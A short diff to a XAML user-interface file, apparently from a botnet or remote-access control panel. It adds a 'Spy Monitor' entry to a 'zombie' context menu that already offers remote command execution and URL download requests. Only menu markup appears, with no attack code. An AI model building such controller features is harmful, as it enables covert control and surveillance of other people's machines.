@@ -41,6 +41,7 @@
                 <ContextMenu x:Key="zombieContextMenu">
                     <MenuItem Header="RemoteCMD" Background="WhiteSmoke" Click="RemoteCMDItem_Click" />
                     <MenuItem Header="URL File Download Request" Background="WhiteSmoke" Click="URLDownloadRequest_Click"/>
+                    <MenuItem Header="Spy Monitor" Background="WhiteSmoke" Click="SpyMonitorItem_Click"></MenuItem>
                 </ContextMenu>
 
             </ListView.Resources>
